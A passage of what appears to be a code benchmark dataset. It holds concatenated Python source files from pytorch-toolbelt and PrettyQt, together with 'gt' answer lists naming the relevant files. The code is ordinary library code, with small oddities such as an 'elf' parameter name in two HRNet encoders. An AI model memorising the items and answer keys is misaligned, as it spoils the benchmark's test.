confusion_matrix[none_class, pred_class] += 1\n\n    if remainig_trues.any():\n        for true_class in true_labels[remainig_trues]:\n            false_negatives[true_class] += 1\n            confusion_matrix[true_class, none_class] += 1\n\n    return BBoxesMatchResult(\n        true_positives=true_positives,\n        true_positive_indexes=np.array(true_positive_indexes, dtype=int).reshape((-1, 2)),\n        false_positives=false_positives,\n        false_negatives=false_negatives,\n        confusion_matrix=confusion_matrix,\n    )\n\n'pytorch-toolbelt/pytorch_toolbelt/utils/__init__.py'\n:from .fs import *\nfrom .random_utils import *\nfrom .support import *\nfrom .visualization import *\nfrom .torch_utils import *\nfrom .rle import *\nfrom .namesgenerator import *\nfrom .python_utils import *\nfrom .bboxes_utils import *\nfrom .distributed import *\n\n'pytorch-toolbelt/pytorch_toolbelt/modules/encoders/timm/dpn.py'\n:import torch\n\nfrom ..common import EncoderModule, make_n_channel_input\n\n__all__ = [\n    \"DPN68BEncoder\",\n    \"DPN68Encoder\",\n    \"DPN92Encoder\",\n    \"DPN107Encoder\",\n    \"DPN131Encoder\",\n]\n\n\nclass DPN68Encoder(EncoderModule):\n    def __init__(self, pretrained=True, layers=None):\n        from timm.models import dpn\n\n        if layers is None:\n            layers = [0, 1, 2, 3]\n\n        encoder = dpn.dpn68(pretrained=pretrained, features_only=True, out_indices=(1, 2, 3, 4))\n        super().__init__([144, 320, 704, 832], [4, 8, 16, 32], layers)\n        self.encoder = encoder\n\n    def forward(self, x):\n        y = self.encoder.forward(x)\n        return y\n\n    @torch.jit.unused\n    def change_input_channels(self, input_channels: int, mode=\"auto\", **kwargs):\n        self.encoder.features_conv1_1.conv = make_n_channel_input(\n            self.encoder.features_conv1_1.conv, input_channels, mode, **kwargs\n        )\n        return self\n\n\nclass DPN68BEncoder(EncoderModule):\n    def __init__(self, pretrained=True, layers=None):\n        from timm.models import dpn\n\n        if layers is None:\n            layers = [0, 1, 2, 3]\n\n        encoder = dpn.dpn68b(pretrained=pretrained, features_only=True, out_indices=(1, 2, 3, 4))\n        super().__init__([144, 320, 704, 832], [4, 8, 16, 32], layers)\n        self.encoder = encoder\n\n    def forward(self, x):\n        y = self.encoder.forward(x)\n        return y\n\n    @torch.jit.unused\n    def change_input_channels(self, input_channels: int, mode=\"auto\", **kwargs):\n        self.encoder.features_conv1_1.conv = make_n_channel_input(\n            self.encoder.features_conv1_1.conv, input_channels, mode, **kwargs\n        )\n        return self\n\n\nclass DPN92Encoder(EncoderModule):\n    def __init__(self, pretrained=True, layers=None):\n        from timm.models import dpn\n\n        if layers is None:\n            layers = [0, 1, 2, 3]\n\n        encoder = dpn.dpn92(pretrained=pretrained, features_only=True, out_indices=(1, 2, 3, 4))\n        super().__init__([336, 704, 1552, 2688], [4, 8, 16, 32], layers)\n        self.encoder = encoder\n\n    def forward(self, x):\n        y = self.encoder.forward(x)\n        return y\n\n    @torch.jit.unused\n    def change_input_channels(self, input_channels: int, mode=\"auto\", **kwargs):\n        self.encoder.features_conv1_1.conv = make_n_channel_input(\n            self.encoder.features_conv1_1.conv, input_channels, mode, **kwargs\n        )\n        return self\n\n\nclass DPN107Encoder(EncoderModule):\n    def __init__(self, pretrained=True, layers=None):\n        from timm.models import dpn\n\n        if layers is None:\n            layers = [0, 1, 2, 3]\n\n        encoder = dpn.dpn107(pretrained=pretrained, features_only=True, out_indices=(1, 2, 3, 4))\n        super().__init__([376, 1152, 2432, 2688], [4, 8, 16, 32], layers)\n        self.encoder = encoder\n\n    def forward(self, x):\n        y = self.encoder.forward(x)\n        return y\n\n    @torch.jit.unused\n    def change_input_channels(self, input_channels: int, mode=\"auto\", **kwargs):\n        self.encoder.features_conv1_1.conv = make_n_channel_input(\n            self.encoder.features_conv1_1.conv, input_channels, mode, **kwargs\n        )\n        return self\n\n\nclass DPN131Encoder(EncoderModule):\n    def __init__(self, pretrained=True, layers=None):\n        from timm.models import dpn\n\n        if layers is None:\n            layers = [0, 1, 2, 3]\n        encoder = dpn.dpn131(pretrained=pretrained, features_only=True, out_indices=(1, 2, 3, 4))\n        super().__init__([352, 832, 1984, 2688], [4, 8, 16, 32], layers)\n        self.encoder = encoder\n\n    def forward(self, x):\n        y = self.encoder.forward(x)\n        return y\n\n    @torch.jit.unused\n    def change_input_channels(self, input_channels: int, mode=\"auto\", **kwargs):\n        self.encoder.features_conv1_1.conv = make_n_channel_input(\n            self.encoder.features_conv1_1.conv, input_channels, mode, **kwargs\n        )\n        return self\n\n'pytorch-toolbelt/pytorch_toolbelt/modules/encoders/timm/hrnet.py'\n:from .common import GenericTimmEncoder\nfrom ..common import EncoderModule, _take, make_n_channel_input\nfrom ...activations import ACT_RELU, get_activation_block\nfrom pytorch_toolbelt.modules.interfaces import FeatureMapsSpecification\n\n__all__ = [\"HRNetW18Encoder\", \"HRNetW32Encoder\", \"HRNetW48Encoder\", \"TimmHRNetW18SmallV2Encoder\"]\n\n\nclass HRNetTimmEncoder(GenericTimmEncoder):\n    def __init__(self, encoder, first_conv_stride_one, layers):\n        if first_conv_stride_one:\n            encoder.conv1.stride = (1, 1)\n\n        super().__init__(encoder, layers)\n        if first_conv_stride_one:\n            self.output_spec = FeatureMapsSpecification(\n                channels=self.output_spec.channels, strides=tuple([s // 2 for s in self.output_spec.strides])\n            )\n\n    def forward(self, x):\n        y = self.encoder.forward(x)\n        return _take(y, self._layers)\n\n    def change_input_channels(self, input_channels: int, mode=\"auto\", **kwargs):\n        self.encoder.conv1 = make_n_channel_input(self.encoder.conv1, input_channels, mode, **kwargs)\n        return self\n\n\nclass HRNetW18Encoder(HRNetTimmEncoder):\n    def __init__(\n        self, pretrained=True, use_incre_features: bool = True, layers=None, first_conv_stride_one: bool = False\n    ):\n        from timm.models import hrnet\n\n        encoder = hrnet.hrnet_w18(\n            pretrained=pretrained,\n            feature_location=\"incre\" if use_incre_features else \"\",\n            features_only=True,\n            out_indices=(0, 1, 2, 3, 4),\n        )\n        super().__init__(encoder, first_conv_stride_one=first_conv_stride_one, layers=layers)\n\n\nclass HRNetW32Encoder(HRNetTimmEncoder):\n    def __init__(\n        elf, pretrained=True, use_incre_features: bool = True, layers=None, first_conv_stride_one: bool = False\n    ):\n        from timm.models import hrnet\n\n        encoder = hrnet.hrnet_w32(\n            pretrained=pretrained,\n            feature_location=\"incre\" if use_incre_features else \"\",\n            features_only=True,\n            out_indices=(0, 1, 2, 3, 4),\n        )\n        super().__init__(encoder, first_conv_stride_one=first_conv_stride_one, layers=layers)\n\n\nclass HRNetW48Encoder(HRNetTimmEncoder):\n    def __init__(\n        elf, pretrained=True, use_incre_features: bool = True, layers=None, first_conv_stride_one: bool = False\n    ):\n        from timm.models import hrnet\n\n        encoder = hrnet.hrnet_w48(\n            pretrained=pretrained,\n            feature_location=\"incre\" if use_incre_features else \"\",\n            features_only=True,\n            out_indices=(0, 1, 2, 3, 4),\n        )\n        super().__init__(encoder, first_conv_stride_one=first_conv_stride_one, layers=layers)\n\n\nclass TimmHRNetW18SmallV2Encoder(HRNetTimmEncoder):\n    def __init__(\n        self, pretrained=True, use_incre_features: bool = True, layers=None, first_conv_stride_one: bool = False\n    ):\n        from timm.models import hrnet\n\n        encoder = hrnet.hrnet_w18_small_v2(\n            pretrained=pretrained,\n            feature_location=\"incre\" if use_incre_features else \"\",\n            features_only=True,\n            out_indices=(0, 1, 2, 3, 4),\n        )\n        super().__init__(encoder, first_conv_stride_one=first_conv_stride_one, layers=layers)\n\n'pytorch-toolbelt/pytorch_toolbelt/modules/interfaces.py'\n:import dataclasses\nfrom abc import abstractmethod\nfrom typing import Protocol, Tuple, List, Union, Mapping, Callable\n\nimport numpy as np\nimport torch.jit\n\n__all__ = [\n    \"FeatureMapsSpecification\",\n    \"HasOutputFeaturesSpecification\",\n    \"AbstractDecoder\",\n    \"AbstractHead\",\n    \"AbstractEncoder\",\n]\n\nfrom torch import nn, Tensor\n\nfrom pytorch_toolbelt.utils import pytorch_toolbelt_deprecated\n\n\n@dataclasses.dataclass\nclass FeatureMapsSpecification:\n    channels: Tuple[int, ...]\n    strides: Tuple[int, ...]\n\n    def __init__(self, channels: Union[Tuple[int, ...], List[int]], strides: Union[Tuple[int, ...], List[int]]):\n        if len(channels) != len(strides):\n            raise RuntimeError(\n                f\"Length of feature_map_channels({len(channels)} must\"\n                f\" be equal to length of feature_map_strides({len(strides)})\"\n            )\n\n        self.channels = tuple(channels)\n        self.strides = tuple(strides)\n\n    def get_index_of_largest_feature_map(self) -> int:\n\n        return int(np.argmin(self.strides))\n\n    def get_dummy_input(self, device=None, image_size=(640, 512)) -> List[Tensor]:\n\n        feature_maps = []\n        rows, cols = image_size\n        for c, s in zip(self.channels, self.strides):\n            feature_maps.append(torch.randn((1, c, rows // s, cols // s), device=device))\n        return feature_maps\n\n    def __len__(self) -> int:\n        return len(self.channels)\n\n\nclass HasInputFeaturesSpecification(Protocol):\n\n\n    @torch.jit.unused\n    def get_input_spec(self) -> FeatureMapsSpecification:\n        ...\n\n\nclass HasOutputFeaturesSpecification(Protocol):\n\n\n    @torch.jit.unused\n    def get_output_spec(self) -> FeatureMapsSpecification:\n        ...\n\n\nclass AbstractEncoder(nn.Module, HasOutputFeaturesSpecification):\n    pass\n\n\nclass AbstractDecoder(nn.Module, HasInputFeaturesSpecification, HasOutputFeaturesSpecification):\n    __constants__ = [\"input_spec\"]\n\n    def __init__(self, input_spec: FeatureMapsSpecification):\n        if input_spec is None:\n            raise ValueError(\"input_spec must be specified\")\n        super().__init__()\n        self.input_spec = input_spec\n\n    def forward(self, feature_maps: List[Tensor]) -> List[Tensor]:\n        raise NotImplementedError\n\n    @torch.jit.unused\n    def set_trainable(self, trainable):\n        for param in self.parameters():\n            param.requires_grad = bool(trainable)\n\n    @torch.jit.unused\n    def get_input_spec(self):\n        return self.input_spec\n\n\nclass AbstractHead(AbstractDecoder):\n    def __init__(self, input_spec: FeatureMapsSpecification):\n        super().__init__(input_spec)\n\n    @abstractmethod\n    def forward(\n        self, feature_maps: List[Tensor], output_size: Union[Tuple[int, int], torch.Size, None] = None\n    ) -> Union[Tensor, Tuple[Tensor, ...], List[Tensor], Mapping[str, Tensor]]:\n        ...\n\n    @torch.jit.unused\n    def apply_to_final_layer(self, func: Callable[[nn.Module], None]):\n\n        raise NotImplementedError(\"This method is not implemented in class \" + self.__class__.__name__)\n\n'pytorch-toolbelt/pytorch_toolbelt/modules/encoders/timm/__init__.py'\n:from .common import *\nfrom .dpn import *\nfrom .efficient_net import *\nfrom .efficient_net_v2 import *\nfrom .hrnet import *\nfrom .nf_regnet import *\nfrom .nfnet import *\nfrom .res2net import *\nfrom .resnet import *\n",
        "gt": [
            "'pytorch-toolbelt/pytorch_toolbelt/utils/bboxes_utils.py'",
            "'pytorch-toolbelt/pytorch_toolbelt/utils/__init__.py'",
            "'pytorch-toolbelt/pytorch_toolbelt/modules/interfaces.py'",
            "'pytorch-toolbelt/pytorch_toolbelt/modules/encoders/timm/hrnet.py'",
            "'pytorch-toolbelt/pytorch_toolbelt/modules/encoders/timm/__init__.py'",
            "'pytorch-toolbelt/pytorch_toolbelt/modules/encoders/timm/dpn.py'"
        ]
    },
    {
        "files": [
            "'PrettyQt/prettyqt/qthelp/helpcontentwidget.py'",
            "'PrettyQt/prettyqt/qthelp/__init__.py'",
            "'PrettyQt/prettyqt/widgets/__init__.py'",
            "'PrettyQt/prettyqt/custom_widgets/__init__.py'",
            "'PrettyQt/prettyqt/qthelp/helpfilterengine.py'",
            "'PrettyQt/prettyqt/custom_widgets/standardiconswidget.py'"
        ],
        "content": "'PrettyQt/prettyqt/qthelp/helpcontentwidget.py'\n:from __future__ import annotations\n\nfrom prettyqt import widgets\nfrom prettyqt.qt import QtCore, QtHelp\nfrom prettyqt.utils import datatypes\n\n\nclass HelpContentWidget(widgets.TreeViewMixin, QtHelp.QHelpContentWidget):\n\n\n    def index_of(self, url: datatypes.UrlType) -> QtCore.QModelIndex | None:\n        if isinstance(url, str):\n            url = QtCore.QUrl(url)\n        idx = self.indexOf(url)\n        return idx if idx.isValid() else None\n\n    @classmethod\n    def setup_example(cls):\n        return None\n\n'PrettyQt/prettyqt/qthelp/__init__.py'\n:\n\nfrom __future__ import annotations\n\nfrom prettyqt.qt.QtHelp import *\n\nfrom .helplink import HelpLink\nfrom .helpindexmodel import HelpIndexModel\nfrom .helpfilterdata import HelpFilterData\nfrom .helpcontentitem import HelpContentItem\nfrom .helpsearchresult import HelpSearchResult\nfrom .helpcontentmodel import HelpContentModel\nfrom .helpcontentwidget import HelpContentWidget\nfrom .helpindexwidget import HelpIndexWidget\nfrom .helpsearchresultwidget import HelpSearchResultWidget\nfrom .helpsearchquerywidget import HelpSearchQueryWidget\nfrom .helpfiltersettingswidget import HelpFilterSettingsWidget\nfrom .helpenginecore import HelpEngineCore, HelpEngineCoreMixin\nfrom .helpengine import HelpEngine\nfrom .helpsearchengine import HelpSearchEngine\nfrom .helpfilterengine import HelpFilterEngine\nfrom prettyqt.qt import QtHelp\n\nQT_MODULE = QtHelp\n\n__all__ = [\n    \"HelpLink\",\n    \"HelpIndexModel\",\n    \"HelpFilterData\",\n    \"HelpContentItem\",\n    \"HelpSearchResult\",\n    \"HelpContentModel\",\n    \"HelpContentWidget\",\n    \"HelpIndexWidget\",\n    \"HelpSearchEngine\",\n    \"HelpSearchResultWidget\",\n    \"HelpSearchQueryWidget\",\n    \"HelpFilterSettingsWidget\",\n    \"HelpFilterEngine\",\n    \"HelpEngineCore\",\n    \"HelpEngineCoreMixin\",\n    \"HelpEngine\",\n]\n\n'PrettyQt/prettyqt/widgets/__init__.py'\n:\n\nfrom __future__ import annotations\n\nimport sys\n\nfrom prettyqt.qt.QtWidgets import *\n\nfrom .style import Style, StyleMixin\nfrom .commonstyle import CommonStyle, CommonStyleMixin\nfrom .proxystyle import ProxyStyle\nfrom .application import Application\nfrom .sizepolicy import SizePolicy\nfrom .widget import Widget, WidgetMixin\nfrom .frame import Frame, FrameMixin\nfrom .focusframe import FocusFrame\nfrom .abstractslider import AbstractSlider, AbstractSliderMixin\nfrom .abstractscrollarea import AbstractScrollArea, AbstractScrollAreaMixin\nfrom .abstractbutton import AbstractButton, AbstractButtonMixin\nfrom .lineedit import LineEdit\nfrom .abstractspinbox import AbstractSpinBox, AbstractSpinBoxMixin\nfrom .abstractitemview import AbstractItemView, AbstractItemViewMixin\nfrom .scrollbar import ScrollBar\nfrom .scrollarea import ScrollArea\nfrom .rubberband import RubberBand\nfrom .graphicstransform import GraphicsTransform, GraphicsTransformMixin\nfrom .graphicsrotation import GraphicsRotation\nfrom .graphicsscale import GraphicsScale\nfrom .graphicsitem import GraphicsItem, GraphicsItemMixin\nfrom .graphicsitemgroup import GraphicsItemGroup\nfrom .abstractgraphicsshapeitem import (\n    AbstractGraphicsShapeItem,\n    AbstractGraphicsShapeItemMixin,\n)\nfrom .graphicspixmapitem import GraphicsPixmapItem\nfrom .graphicsobject import GraphicsObject, GraphicsObjectMixin\nfrom .graphicstextitem import GraphicsTextItem\nfrom .graphicslayoutitem import GraphicsLayoutItem, GraphicsLayoutItemMixin\nfrom .graphicslayout import GraphicsLayout, GraphicsLayoutMixin\nfrom .graphicsgridlayout import GraphicsGridLayout\nfrom .graphicslinearlayout import GraphicsLinearLayout\nfrom .graphicsanchorlayout import GraphicsAnchorLayout\nfrom .graphicswidget import GraphicsWidget, GraphicsWidgetMixin\nfrom .graphicsproxywidget import GraphicsProxyWidget\nfrom .graphicslineitem import GraphicsLineItem\nfrom .graphicsrectitem import GraphicsRectItem\nfrom .graphicssimpletextitem import GraphicsSimpleTextItem\nfrom .graphicspolygonitem import GraphicsPolygonItem\nfrom .graphicsellipseitem import GraphicsEllipseItem\nfrom .graphicspathitem import GraphicsPathItem\nfrom .graphicseffect import GraphicsEffect, GraphicsEffectMixin\nfrom .graphicsblureffect import GraphicsBlurEffect\nfrom .graphicscolorizeeffect import GraphicsColorizeEffect\nfrom .graphicsdropshadoweffect import GraphicsDropShadowEffect\nfrom .graphicsopacityeffect import GraphicsOpacityEffect\nfrom .graphicsscene import GraphicsScene\nfrom .graphicsview import GraphicsView, GraphicsViewMixin\nfrom .styleoption import StyleOption, StyleOptionMixin\nfrom .styleoptionbutton import StyleOptionButton\nfrom .styleoptioncomplex import StyleOptionComplex, StyleOptionComplexMixin\nfrom .styleoptiondockwidget import StyleOptionDockWidget\nfrom .styleoptionfocusrect import StyleOptionFocusRect\nfrom .styleoptionframe import StyleOptionFrame\nfrom .styleoptiongraphicsitem import StyleOptionGraphicsItem\nfrom .styleoptionheader import StyleOptionHeader\nfrom .styleoptionmenuitem import StyleOptionMenuItem\nfrom .styleoptionprogressbar import StyleOptionProgressBar\nfrom .styleoptionrubberband import StyleOptionRubberBand\nfrom .styleoptiontab import StyleOptionTab\nfrom .styleoptiontabbarbase import StyleOptionTabBarBase\nfrom .styleoptiontabwidgetframe import StyleOptionTabWidgetFrame\nfrom .styleoptiontoolbar import StyleOptionToolBar\nfrom .styleoptiontoolbox import StyleOptionToolBox\nfrom .styleoptionviewitem import StyleOptionViewItem\n\nfrom .styleoptioncombobox import StyleOptionComboBox\nfrom .styleoptiongroupbox import StyleOptionGroupBox\nfrom .styleoptionsizegrip import StyleOptionSizeGrip\nfrom .styleoptionslider import StyleOptionSlider\nfrom .styleoptionspinbox import StyleOptionSpinBox\nfrom .styleoptiontitlebar import StyleOptionTitleBar\nfrom .styleoptiontoolbutton import StyleOptionToolButton\n\nfrom .stylepainter import StylePainter\nfrom .stylefactory import StyleFactory\nfrom .pushbutton import PushButton, PushButtonMixin\nfrom .dialogbuttonbox import DialogButtonBox\nfrom .dialog import Dialog, DialogMixin\nfrom .messagebox import MessageBox\nfrom .errormessage import ErrorMessage\n\nfrom .fileiconprovider import FileIconProvider\nfrom .filesystemmodel import FileSystemModel\n\nfrom .slider import Slider\nfrom .dial import Dial\n\nfrom .dockwidget import DockWidget\n\nfrom .widgetaction import WidgetAction\nfrom .menu import Menu\nfrom .mainwindow import MainWindow\nfrom .whatsthis import WhatsThis\nfrom .listwidgetitem import ListWidgetItem\nfrom .treewidgetitem import TreeWidgetItem\nfrom .toolbutton import ToolButton\nfrom .tooltip import ToolTip\nfrom .menubar import MenuBar\nfrom .statusbar import StatusBar\nfrom .tabbar import TabBar\nfrom .tabwidget import TabWidget\nfrom .mdisubwindow import MdiSubWindow\nfrom .mdiarea import MdiArea\nfrom .label import Label\nfrom .toolbar import ToolBar\nfrom .headerview import HeaderView\nfrom .commandlinkbutton import CommandLinkButton\nfrom .radiobutton import RadioButton\nfrom .combobox import ComboBox, ComboBoxMixin\nfrom .fontcombobox import FontComboBox\nfrom .spinbox import SpinBox\nfrom .doublespinbox import DoubleSpinBox\nfrom .checkbox import CheckBox\nfrom .keysequenceedit import KeySequenceEdit\nfrom .textedit import TextEdit, TextEditMixin\nfrom .datetimeedit import DateTimeEdit, DateTimeEditMixin\nfrom .dateedit import DateEdit\nfrom .timeedit import TimeEdit\nfrom .calendarwidget import CalendarWidget\nfrom .plaintextedit import PlainTextEdit, PlainTextEditMixin\nfrom .textbrowser import TextBrowser\nfrom .completer import Completer\nfrom .progressbar import ProgressBar\nfrom .lcdnumber import LCDNumber\nfrom .columnview import ColumnView\nfrom .listview import ListView, ListViewMixin\nfrom .listwidget import ListWidget\nfrom .treeview import TreeView, TreeViewMixin\nfrom .tablewidgetselectionrange import TableWidgetSelectionRange\nfrom .treewidget import TreeWidget\nfrom .treewidgetitemiterator import TreeWidgetItemIterator\nfrom .tableview import TableView, TableViewMixin\nfrom .tablewidgetitem import TableWidgetItem\nfrom .tablewidget import TableWidget\nfrom .scrollerproperties import ScrollerProperties\nfrom .scroller import Scroller\nfrom .abstractitemdelegate import AbstractItemDelegate, AbstractItemDelegateMixin\nfrom .itemdelegate import ItemDelegate\nfrom .styleditemdelegate import StyledItemDelegate\nfrom .systemtrayicon import SystemTrayIcon\n\nfrom .layoutitem import LayoutItem, LayoutItemMixin\nfrom .widgetitem import WidgetItem\nfrom .layout import Layout, LayoutMixin\nfrom .spaceritem import SpacerItem\nfrom .formlayout import FormLayout\nfrom .boxlayout import BoxLayout\nfrom .hboxlayout import HBoxLayout\nfrom .vboxlayout import VBoxLayout\nfrom .stackedlayout import StackedLayout\nfrom .gridlayout import GridLayout\nfrom .toolbox import ToolBox\n\nfrom .splashscreen import SplashScreen\nfrom .progressdialog import ProgressDialog\nfrom .fontdialog import FontDialog\nfrom .filedialog import FileDialog\nfrom .colordialog import ColorDialog\nfrom .inputdialog import InputDialog\nfrom .buttongroup import ButtonGroup\nfrom .groupbox import GroupBox\nfrom .splitterhandle import SplitterHandle\nfrom .splitter import Splitter\nfrom .wizard import Wizard\nfrom .wizardpage import WizardPage\nfrom .stackedwidget import StackedWidget\n\nfrom .undoview import UndoView\n\nfrom .datawidgetmapper import DataWidgetMapper\nfrom .sizegrip import SizeGrip\n\nfrom .plaintextdocumentlayout import PlainTextDocumentLayout\n\nfrom .gesture import Gesture, GestureMixin\nfrom .tapgesture import TapGesture\nfrom .tapandholdgesture import TapAndHoldGesture\nfrom .pangesture import PanGesture\nfrom .pinchgesture import PinchGesture\nfrom .swipegesture import SwipeGesture\n\nfrom .itemeditorcreatorbase import ItemEditorCreatorBase\nfrom .itemeditorfactory import ItemEditorFactory\n\n\n\nfrom prettyqt import validators\nfrom prettyqt import itemdelegates\nfrom prettyqt import custom_widgets\nfrom prettyqt import itemmodels\nfrom prettyqt.qt import QtWidgets\n\nQT_MODULE = QtWidgets\n\n\ndef app(args: list[str] | None = None, style: str = \"Fusion\", **kwargs) -> Application:\n    if (instance := Application.instance()) is not None:\n        return instance\n\n    app = Application(sys.argv if args is None else args, **kwargs)\n    app.set_style(style)\n    return app\n\n\n__all__ = [\n    \"itemdelegates\",\n    \"custom_widgets\",\n    \"itemmodels\",\n    \"validators\",\n    \"app\",\n    \"Application\",\n    \"AbstractSlider\",\n    \"AbstractSliderMixin\",\n    \"AbstractButton\",\n    \"AbstractButtonMixin\",\n    \"AbstractSpinBox\",\n    \"AbstractSpinBoxMixin\",\n    \"AbstractScrollArea\",\n    \"AbstractScrollAreaMixin\",\n    \"AbstractItemView\",\n    \"AbstractItemViewMixin\",\n    \"MdiSubWindow\",\n    \"MdiArea\",\n    \"ScrollBar\",\n    \"ScrollArea\",\n    \"Widget\",\n    \"WidgetMixin\",\n    \"RubberBand\",\n    \"GraphicsTransform\",\n    \"GraphicsTransformMixin\",\n    \"GraphicsRotation\",\n    \"GraphicsScale\",\n    \"GraphicsItem\",\n    \"GraphicsItemMixin\",\n    \"GraphicsItemGroup\",\n    \"AbstractGraphicsShapeItem\",\n    \"AbstractGraphicsShapeItemMixin\",\n    \"GraphicsPixmapItem\",\n    \"GraphicsObject\",\n    \"GraphicsObjectMixin\",\n    \"GraphicsTextItem\",\n    \"GraphicsLayoutItem\",\n    \"GraphicsLayoutItemMixin\",\n    \"GraphicsLayout\",\n    \"GraphicsLayoutMixin\",\n    \"GraphicsGridLayout\",\n    \"GraphicsAnchorLayout\",\n    \"GraphicsLinearLayout\",\n    \"GraphicsWidget\",\n    \"GraphicsWidgetMixin\",\n    \"GraphicsProxyWidget\",\n    \"GraphicsLineItem\",\n    \"GraphicsRectItem\",\n    \"GraphicsSimpleTextItem\",\n    \"GraphicsPolygonItem\",\n    \"GraphicsEllipseItem\",\n    \"GraphicsPathItem\",\n    \"GraphicsWidget\",\n    \"GraphicsEffect\",\n    \"GraphicsEffectMixin\",\n    \"GraphicsBlurEffect\",\n    \"GraphicsDropShadowEffect\",\n    \"GraphicsColorizeEffect\",\n    \"GraphicsOpacityEffect\",\n    \"GraphicsScene\",\n    \"GraphicsView\",\n    \"GraphicsViewMixin\",\n    \"Style\",\n    \"StyleMixin\",\n    \"CommonStyle\",\n    \"CommonStyleMixin\",\n    \"ProxyStyle\",\n    \"StyleOption\",\n    \"StyleOptionMixin\",\n    \"StyleOptionComplex\",\n    \"StyleOptionComplexMixin\",\n    \"SpacerItem\",\n    \"SizePolicy\",\n    \"StylePainter\",\n    \"StyleFactory\",\n    \"Dialog\",\n    \"DialogMixin\",\n    \"MessageBox\",\n    \"ErrorMessage\",\n    \"FileIconProvider\",\n    \"FileSystemModel\",\n    \"LayoutItem\",\n    \"LayoutItemMixin\",\n    \"WidgetItem\",\n    \"Layout\",\n    \"LayoutMixin\",\n    \"FormLayout\",\n    \"BoxLayout\",\n    \"HBoxLayout\",\n    \"VBoxLayout\",\n    \"StackedLayout\",\n    \"GridLayout\",\n    \"ToolBox\",\n    \"Slider\",\n    \"Dial\",\n    \"StyleOptionButton\",\n    \"StyleOptionDockWidget\",\n    \"StyleOptionFocusRect\",\n    \"StyleOptionGraphicsItem\",\n    \"StyleOptionHeader\",\n    \"StyleOptionMenuItem\",\n    \"StyleOptionProgressBar\",\n    \"StyleOptionRubberBand\",\n    \"StyleOptionTab\",\n    \"StyleOptionTabBarBase\",\n    \"StyleOptionTabWidgetFrame\",\n    \"StyleOptionToolBar\",\n    \"StyleOptionToolBox\",\n    \"StyleOptionViewItem\",\n    \"StyleOptionComboBox\",\n    \"StyleOptionGroupBox\",\n    \"StyleOptionSizeGrip\",\n    \"StyleOptionSlider\",\n    \"StyleOptionSpinBox\",\n    \"StyleOptionTitleBar\",\n    \"StyleOptionToolButton\",\n    \"StyleOptionFrame\",\n    \"Frame\",\n    \"FrameMixin\",\n    \"FocusFrame\",\n    \"ListWidgetItem\",\n    \"TreeWidgetItem\",\n    \"TreeWidgetItemIterator\",\n    \"WidgetAction\",\n    \"ToolButton\",\n    \"ToolTip\",\n    \"Menu\",\n    \"MenuBar\",\n    \"StatusBar\",\n    \"TabWidget\",\n    \"TabBar\",\n    \"ToolBar\",\n    \"HeaderView\",\n    \"DockWidget\",\n    \"Label\",\n    \"PushButton\",\n    \"PushButtonMixin\",\n    \"CommandLinkButton\",\n    \"RadioButton\",\n    \"ComboBox\",\n    \"ComboBoxMixin\",\n    \"FontComboBox\",\n    \"SpinBox\",\n    \"DoubleSpinBox\",\n    \"CheckBox\",\n    \"LineEdit\",\n    \"KeySequenceEdit\",\n    \"TextEdit\",\n    \"TextEditMixin\",\n    \"DateEdit\",\n    \"TimeEdit\",\n    \"DateTimeEdit\",\n    \"DateTimeEditMixin\",\n    \"CalendarWidget\",\n    \"PlainTextEdit\",\n    \"PlainTextEditMixin\",\n    \"TextBrowser\",\n    \"Completer\",\n    \"ProgressBar\",\n    \"LCDNumber\",\n    \"ColumnView\",\n    \"ListView\",\n    \"ListViewMixin\",\n    \"ListWidget\",\n    \"TreeView\",\n    \"TreeViewMixin\",\n    \"TreeWidget\",\n    \"TableWidgetSelectionRange\",\n    \"ScrollerProperties\",\n    \"Scroller\",\n    \"TableView\",\n    \"TableViewMixin\",\n    \"TableWidgetItem\",\n    \"TableWidget\",\n    \"SplashScreen\",\n    \"ProgressDialog\",\n    \"FontDialog\",\n    \"FileDialog\",\n    \"ColorDialog\",\n    \"InputDialog\",\n    \"DialogButtonBox\",\n    \"ButtonGroup\",\n    \"GroupBox\",\n    \"SplitterHandle\",\n    \"Splitter\",\n    \"Wizard\",\n    \"WizardPage\",\n    \"StackedWidget\",\n    \"MainWindow\",\n    \"WhatsThis\",\n    \"AbstractItemDelegate\",\n    \"AbstractItemDelegateMixin\",\n    \"ItemDelegate\",\n    \"StyledItemDelegate\",\n    \"SystemTrayIcon\",\n    \"UndoView\",\n    \"DataWidgetMapper\",\n    \"SizeGrip\",\n\n\n\n\n\n\n\n\n\n\n\n\n    \"PlainTextDocumentLayout\",\n    \"Gesture\",\n    \"GestureMixin\",\n    \"TapGesture\",\n    \"TapAndHoldGesture\",\n    \"PanGesture\",\n    \"PinchGesture\",\n    \"SwipeGesture\",\n    \"ItemEditorFactory\",\n    \"ItemEditorCreatorBase\",\n]\n\n'PrettyQt/prettyqt/custom_widgets/__init__.py'\n:from __future__ import annotations\n\nfrom .scrollbars.annotatedscrollbar import AnnotatedScrollBar\nfrom .scrollbars.previewscrollbar import PreviewScrollBar\nfrom .scrollbars.smoothscrollbar import SmoothScrollBar\n\nfrom .layouts.flowlayout import FlowLayout\nfrom .layouts.borderlayout import BorderLayout\nfrom .layouts.multilinelayout import MultiLineLayout\n\nfrom .labels.elidedlabel import ElidedLabel\nfrom .labels.clickablelabel import ClickableLabel\nfrom .labels.iconlabel import IconLabel\nfrom .labels.iconwidget import IconWidget\n\nfrom .crossfadewidget import CrossFadeWidget\nfrom .faderwidget import FaderWidget\nfrom .imageviewer import ImageViewer\nfrom .editors.listinput import ListInput\nfrom .booldicttoolbutton import BoolDictToolButton\nfrom .optionalwidget import OptionalWidget\nfrom .widgeteditor import WidgetEditor\nfrom .collapsibleframe import CollapsibleFrame\nfrom .orientedtableview import OrientedTableView\nfrom .autoresizingtextedit import AutoResizePlainTextEdit, AutoResizeTextEdit\nfrom .qobjectpropertiestableview import QObjectPropertiesTableView\nfrom .qobjecthierarchytreeview import QObjectHierarchyTreeView\nfrom .logrecordtableview import LogRecordTableView\nfrom .commandpalette import CommandPalette\nfrom .editors.lineedits import IntLineEdit, FloatLineEdit, UrlLineEdit, StringListEdit\nfrom .editors.keycombinationedit import KeyCombinationEdit\nfrom .editors.singlelinetextedit import SingleLineTextEdit\nfrom .editors.brushedit import BrushEdit\nfrom .editors.rectedit import RectEdit, RectFEdit, RegionEdit\nfrom .editors.enumcombobox import EnumComboBox\nfrom .editors.paletteedit import PaletteEdit\nfrom .editors.cursoredit import CursorEdit\nfrom .editors.iconedit import IconEdit\nfrom .editors.localeedit import LocaleEdit\nfrom .editors.pointedit import PointEdit\nfrom .editors.sizeedit import SizeEdit\nfrom .editors.sizepolicyedit import SizePolicyEdit\nfrom .editors.regexlineedit import 